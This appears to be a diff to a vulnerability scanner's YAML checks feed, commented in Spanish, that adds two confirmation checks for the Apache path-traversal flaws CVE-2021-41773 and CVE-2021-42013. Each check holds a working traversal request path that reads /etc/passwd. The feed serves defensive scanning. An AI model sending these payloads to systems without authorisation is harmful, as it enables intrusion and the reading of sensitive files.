@@ -8,7 +8,7 @@
 # feedVersion sube cuando el feed gana una familia nueva o un protocolo nuevo
 # bajo una existente; el arreglo de un check ya presente sube el 'version' de
 # ese check, no esta cadena. Ver CHECKS_FEED_VERSION en checks.py.
-feedVersion: lybra-checks-15
+feedVersion: lybra-checks-16
 checks:
   - id: git-config-exposure
     version: 1
@@ -1334,5 +1334,64 @@ checks:
               - '^(?:500|502|504|530|534|431)'
     finding:
       title: 'FTP: sin cifrado disponible (AUTH TLS no soportado)'
+      qod: 99
+      confirmed: true
+  # ===================================================================
+  # Confirmadores (L29): ascienden una hipótesis por versión de
+  # confirmed=false/qod=70 a confirmed=true/qod=99. Sólo corren si el
+  # matcher de versiones ya propuso su CVE, y NUNCA explotan — comprueban
+  # la condición sin ejecutar nada en el objetivo.
+  # ===================================================================
+  # CVE-2021-41773: path traversal de Apache 2.4.49. La prueba lee
+  # /etc/passwd por la ruta vulnerable — una lectura, no una ejecución. Si
+  # el cuerpo trae la línea de root, el fichero se sirvió: confirmado.
+  - id: apache-cve-2021-41773-path-traversal
+    version: 1
+    type: http
+    category: vulnerability
+    severity: CRITICAL
+    service: http
+    mode: safe
+    confirms: CVE-2021-41773
+    requests:
+      - method: GET
+        path: /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+        matchers-condition: and
+        matchers:
+          - type: status
+            value:
+              - 200
+          - type: regex
+            part: body
+            regex:
+              - 'root:.*:0:0:'
+    finding:
+      title: 'Apache path traversal confirmado (CVE-2021-41773): /etc/passwd legible'
+      qod: 99
+      confirmed: true
+  # CVE-2021-42013: el bypass del arreglo incompleto de 41773 en Apache
+  # 2.4.50, con doble codificación de los puntos.
+  - id: apache-cve-2021-42013-path-traversal
+    version: 1
+    type: http
+    category: vulnerability
+    severity: CRITICAL
+    service: http
+    mode: safe
+    confirms: CVE-2021-42013
+    requests:
+      - method: GET
+        path: /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+        matchers-condition: and
+        matchers:
+          - type: status
+            value:
+              - 200
+          - type: regex
+            part: body
+            regex:
+              - 'root:.*:0:0:'
+    finding:
+      title: 'Apache path traversal confirmado (CVE-2021-42013): /etc/passwd legible'
       qod: 99
       confirmed: true
